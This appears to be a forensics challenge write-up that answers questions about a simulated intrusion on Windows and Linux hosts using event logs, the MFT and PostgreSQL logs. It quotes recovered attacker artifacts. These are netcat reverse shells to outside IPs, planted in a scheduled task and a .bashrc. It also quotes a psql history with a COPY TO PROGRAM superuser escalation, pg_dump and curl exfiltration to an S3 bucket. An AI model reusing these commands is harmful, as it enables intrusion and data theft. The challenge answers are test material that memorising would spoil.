# Analysis logs
- Using autospy to automatically parse logs and finding potential artifacts
-> check autoruns, schedule tasks, file, documents,... found a suspicious schedule task:
```bash 
<Actions Context="Author">
    <Exec>
      <Command>C:\Windows\INF\networkconn.exe</Command>
      <Arguments>-e cmd.exe 34.234.202.16 2424</Arguments>
    </Exec>
  </Actions>
  (this maybe a nc with -e cmd arg, so it should be a revshell)
```
- Also, found a user joining domain, this user can be used for lateral movement (***aarush***)
- In autospy, find all run programs belong to aarush user, found some other strange things (net.exe, net1.exe, netscan.exe). The crucial thing here is netscan.exe also in **C:\Windows\INF**. The I guess this has something more on this directory.
- Parse $MFT by MFTcmd by EricZimmerman, then find all pe file in **C:\Windows\INF**, it points me to 3 exe file:
+ netscan.exe
+ networkconn.exe
+ WinSysInfo.exe
-> Now, I can conclude this is directory that TA downloads tools used for recon -> Q2: C:\Windows\INF

- I have some gold in my hand, then move to the next part. Try to find when does any of files found above runs. But unfortunately, no 4688 or 1 event for those pe, no log from powershell indicates process created, no console history file exist, also parse Amcache and parse hive from aarush user, but found nothing. But instead, I see some 5379 events, which is account enumeration, something like Q5 mentions. an exe should be used for enum user, so I guess, this can be any of 3 files above. USN Journal ($UsnJrnl) log file contains all data about file operations. But $UsnJrnl is not here, parse $LogFile by [LogFileParser](https://github.com/jschicht/LogFileParser), then output will contains a file LogFile_lfUsnJrnl.csv, using grep to traverse through file:
```bash
cat LogFile_lfUsnJrnl.csv| grep -i '.exe' | grep -i 'rename'
cat LogFile_lfUsnJrnl.csv| grep -i '.exe' | grep -i 'rename' | grep -i 'winsys' -B3 -A3

```
- see, WinSysView orgiginal name is CredentialsFileView, then I can sure \INF dir belongs to attacker
Q5: CredentialsFileView
- Get stuck in this, so I try to find evils in linux log (DB machine). Walk through the log, I found something about login session:
```bash
sysadmin pts/0        Thu Oct 24 07:42:57 2024   still logged in                       10.10.0.1
sdb-aroy pts/0        Thu Oct 24 06:42:52 2024 - Thu Oct 24 07:02:48 2024  (00:19)     10.10.2.55

sysadmin         pts/0    10.10.0.1        Thu Oct 24 07:42:57 +0000 2024

sdb-aroy         pts/0    10.10.2.55       Thu Oct 24 06:42:52 +0000 2024
```
- As mention above, attack occured during 24/10/2024, then I can conclude that attacker use sdb-aroy account to connect db
Q8: db-aroy
Q9: 10.10.2.55
- Because attacker need to extract data from postgre db, so extract all /var/log to get all logs, read postgre log from:
"SalsaDance\catscale_out\Logs\sdb00-20241024-0743-var-log\var\log\postgresql"
```bash
2024-10-24 06:49:37.710 UTC [69316] sdb-aroy@ATM ERROR:  permission denied for table accounts
2024-10-24 06:49:37.710 UTC [69316] sdb-aroy@ATM STATEMENT:  SELECT * FROM accounts;
2024-10-24 06:49:48.381 UTC [69316] sdb-aroy@ATM ERROR:  permission denied for table carddetails
2024-10-24 06:49:48.381 UTC [69316] sdb-aroy@ATM STATEMENT:  SELECT * FROM carddetails;
```
-> Q10: SELECT * FROM accounts;

- I examinate some hiden file like .history,... to find recent command, then I found something smellthy:
```bash
SELECT current_user;
SELECT * FROM pg_stat_activity;
\du 
\l
\c ATM
\dt
\d accounts
\d caddetails
\d carddetails
\d users
SELECT * FROM accounts;
SELECT * FROM carddetails;
COPY (SELECT '') TO PROGRAM 'psql -U postgres -c ''ALTER USER "sdb-aroy" WITH SUPERUSER;''';
CREATE USER "sdb-admin" WITH LOGIN SUPERUSER;
ALTER ROLE "sdb-admin" WITH PASSWORD 'br1ghtLightz';
\du
\! pg_dump -U "sdb-aroy" -h 127.0.0.1 -d ATM -f /tmp/atm.sql
curl -X PUT -T /tmp/atm.sql https://festival-of-files.s3.amazonaws.com/atm.sqlexit
\q
```
-> Q11: COPY (SELECT '') TO PROGRAM 'psql -U postgres -c ''ALTER USER "sdb-aroy" WITH SUPERUSER;''';
-> Q12: pg_dump
-> Q13: https://festival-of-files.s3.amazonaws.com/atm.sql

- In Q14, I have already found a persistent schedule task on window logs, but I have confusion for linux log, so I built a script for automatically searching IP in all file in logs, then it points me to ***catscale_out\User_Files\hidden-user-home-dir\home\sdb-aroy\.bashrc***:
```bash
unset color_prompt force_color_prompt
nc -e /bin/bash 3.224.124.130 2323 2>/dev/null &
# If this is an xterm set the title to user@host:dir
case "$TERM" in
```
and also windows **SWS25\C\Windows\System32\Tasks\WindowsNetworkConnector**:
```bash
<Exec>
      <Command>C:\Windows\INF\networkconn.exe</Command>
      <Arguments>-e cmd.exe 34.234.202.16 2424</Arguments>
    </Exec>
  </Actions>
```
Q14: 3.224.124.130, 34.234.202.16
(searching script can be found in [myrepo](https://github.com/luckystars0612/Forensics/blob/main/Automate%20searching%20scripts/search_ip_through_dirs_exact_slow.py))
- Return to winlogs, I found a prefetch file name **nltest**, this must be the native window bin that attacker uses for gathering domain info
Q1: 2024-10-24 06:27:29
- After using nltest to gather info about DC, I found a suspicious process named bitsadmin, which can be used for downloading, execute, even cleaning indicators and exfiltrating data.
Q3: bitsadmin.exe
- The technique ID of using bitsadmin is t1197
Q4:T1197
Q15: examinate rdp event logs (event 1025)
```bash
RDP ClientActiveX has connected to the server
```
Q16: end session time is 07:34:40 UTC, so the session duration is 1615
